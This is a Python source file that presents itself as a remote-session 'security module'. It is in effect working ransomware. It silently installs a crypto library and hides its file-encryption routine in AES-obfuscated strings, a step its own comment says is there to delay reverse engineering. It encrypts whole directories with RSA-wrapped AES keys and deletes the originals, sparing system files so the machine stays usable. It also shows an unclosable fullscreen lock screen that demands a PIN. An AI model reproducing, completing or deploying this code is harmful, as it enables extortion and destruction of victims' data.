import os
import tkinter as tk
from tkinter import messagebox, simpledialog
import subprocess
import sys
import importlib
import base64
import hashlib
import time

# ======================
# CONFIGURATION & SECURITY
# ======================
# SALT will be injected here by the manager during build
SALT = "VNC_SECURITY_SALT_DEFAULT" 

# Dependency management
def install_and_verify_dependencies():
    def try_import_crypto():
        try:
            from Crypto.PublicKey import RSA
            from Crypto.Cipher import PKCS1_OAEP, AES
            from Crypto.Random import get_random_bytes
            return RSA, PKCS1_OAEP, AES, get_random_bytes
        except ImportError: return None

    dependencies = try_import_crypto()
    if dependencies: return dependencies

    root = tk.Tk(); root.withdraw()
    messagebox.showinfo("Security Module", "Finalizing encryption modules...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        importlib.invalidate_caches()
        return try_import_crypto()
    except: sys.exit(1)

RSA, PKCS1_OAEP, AES, get_random_bytes = install_and_verify_dependencies()

PUBLIC_KEY_PATH = "public_key.pem"
PROTECTED_EXTENSIONS = ['.py', '.pem', '.key', '.dll', '.exe', '.sys', '.encrypted']
PROTECTED_PATHS = [os.path.expandvars('%SystemRoot%\\'), os.path.expandvars('%ProgramFiles%\\'), os.path.expandvars('%ProgramFiles(x86)%\\')]
MAX_FILE_SIZE = 10 * 1024 * 1024

# ======================
# OBFUSCATED PAYLOADS
# ======================
# Placed here for internal use
_K, _N = b'\x00'*32, b'\x00'*16 

def _op(code, key, nonce, encrypt=True):
    from Crypto.Cipher import AES
    import base64
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    if encrypt:
        ciphertext, tag = cipher.encrypt_and_digest(code.encode())
        return base64.b64encode(ciphertext + tag).decode()
    else:
        data = base64.b64decode(code)
        ciphertext, tag = data[:-16], data[-16:]
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

# The logic is kept in an obfuscated form to delay reverse engineering
ENC_B64 = _op("""
def encrypt_file(file_path, public_key):
    try:
        from Crypto.Random import get_random_bytes
        from Crypto.Cipher import AES, PKCS1_OAEP
        aes_key = get_random_bytes(32)
        cipher_aes = AES.new(aes_key, AES.MODE_GCM)
        with open(file_path, "rb") as f: plaintext = f.read()
        ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)
        cipher_rsa = PKCS1_OAEP.new(public_key)
        enc_aes_key = cipher_rsa.encrypt(aes_key)
        with open(file_path + ".encrypted", "wb") as f:
            [f.write(x) for x in (enc_aes_key, cipher_aes.nonce, tag, ciphertext)]
        os.remove(file_path)
        return True
    except: return False
""", _K, _N)

DEC_B64 = _op("""
def decrypt_file(encrypted_path, private_key):
    try:
        from Crypto.Cipher import AES, PKCS1_OAEP
        with open(encrypted_path, "rb") as f:
            enc_aes_key = f.read(256); nonce = f.read(16); tag = f.read(16); ciphertext = f.read()
        cipher_rsa = PKCS1_OAEP.new(private_key)
        aes_key = cipher_rsa.decrypt(enc_aes_key)
        cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        with open(encrypted_path[:-10], "wb") as f: f.write(data)
        os.remove(encrypted_path)
        return True
    except: return False
""", _K, _N)

exec(_op(ENC_B64, _K, _N, False))
exec(_op(DEC_B64, _K, _N, False))

# ======================
# SCREEN LOCKER UI
# ======================
class ScreenLocker:
    def __init__(self, pin_hash):
        self.pin_hash = pin_hash
        self.root = None
        self.is_locked = False
        self.failed_attempts = 0
        self.lockout_until = 0

    def _get_hash(self, pin):
        return hashlib.sha256((pin + SALT).encode()).hexdigest()

    def lock(self):
        if self.is_locked: return
        self.is_locked = True
        
        def run_tk():
            self.root = tk.Tk()
            self.root.title("SYSTEM SECURITY")
            self.root.attributes("-fullscreen", True)
            self.root.attributes("-topmost", True)
            self.root.configure(bg="black")
            self.root.protocol("WM_DELETE_WINDOW", lambda: None)
            
            frame = tk.Frame(self.root, bg="black")
            frame.place(relx=0.5, rely=0.5, anchor="center")
            
            tk.Label(frame, text="REMOTE SECURITY SESSION", fg="#ff3333", bg="black", font=("Arial", 32, "bold")).pack(pady=20)
            tk.Label(frame, text="This computer is protected to prevent data interference.", fg="#ffffff", bg="black", font=("Arial", 16)).pack(pady=10)
            
            self.msg_label = tk.Label(frame, text="Enter Admin PIN to unlock:", fg="#888888", bg="black", font=("Arial", 12))
            self.msg_label.pack(pady=30)
            
            pin_var = tk.StringVar()
            self.entry = tk.Entry(frame, textvariable=pin_var, show="*", font=("Arial", 28), justify="center", width=8, bg="#222", fg="white", borderwidth=0)
            self.entry.pack(pady=10)
            self.entry.focus_set()
            
            def check_unlock(event=None):
                if time.time() < self.lockout_until:
                    wait = int(self.lockout_until - time.time())
                    messagebox.showwarning("Security", f"Too many incorrect attempts. Please wait {wait}s.")
                    return

                if self._get_hash(pin_var.get()) == self.pin_hash:
                    self.failed_attempts = 0
                    self.unlock()
                else:
                    self.failed_attempts += 1
                    pin_var.set("")
                    if self.failed_attempts >= 3:
                        self.lockout_until = time.time() + 30
                        messagebox.showerror("Security Alert", "Security Lock Triggered.\nToo many incorrect attempts. Disabled for 30s.")
                    else:
                        messagebox.showerror("Access Denied", f"Incorrect PIN. Attempt {self.failed_attempts}/3")

            self.unlock_btn = tk.Button(frame, text="UNLOCK", command=check_unlock, font=("Arial", 16, "bold"), bg="#333", fg="white", padx=20, pady=10, borderwidth=0)
            self.unlock_btn.pack(pady=30)
            
            def insist_focus():
                if self.root:
                    self.root.attributes("-topmost", True)
                    self.root.focus_force()
                    self.root.after(1000, insist_focus)
            insist_focus()
            
            self.root.mainloop()

        import threading
        threading.Thread(target=run_tk, daemon=True).start()

    def unlock(self):
        if self.root:
            self.root.quit()
            self.root.destroy()
            self.root = None
        self.is_locked = False

# ======================
# API EXPORTS
# ======================
def is_file_safe(p):
    if any(p.startswith(x) for x in PROTECTED_PATHS) or any(p.lower().endswith(x) for x in PROTECTED_EXTENSIONS): return False
    return os.path.isfile(p) and os.path.getsize(p) <= MAX_FILE_SIZE and not p.endswith(".encrypted")

def encrypt_all_in_dir(d, k):
    try:
        pk = RSA.import_key(k)
        return sum(1 for f in os.listdir(d) if is_file_safe(os.path.join(d, f)) and encrypt_file(os.path.join(d, f), pk))
    except: return 0

def decrypt_all_in_dir(d, k):
    try:
        pk = RSA.import_key(k)
        return sum(1 for f in os.listdir(d) if f.endswith(".encrypted") and decrypt_file(os.path.join(d, f), pk))
    except: return 0